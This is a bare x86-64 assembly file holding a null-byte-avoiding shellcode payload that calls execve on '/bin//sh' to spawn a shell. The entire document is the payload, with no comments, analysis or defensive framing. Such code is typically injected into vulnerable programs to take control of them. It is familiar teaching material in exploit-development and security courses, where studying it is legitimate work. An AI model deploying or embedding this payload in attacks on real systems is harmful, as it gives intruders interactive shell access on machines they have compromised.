section .text
global _start

_start:

	xor	rax, rax
	add	al, 59

	xor	rcx, rcx
	push	rcx

	mov	rbx, 0x68732f2f6e69622f
	push	rbx
	mov	rdi, rsp

	push	rcx
	mov	rsi, rsp

	mov	rdx, rsp

	syscall
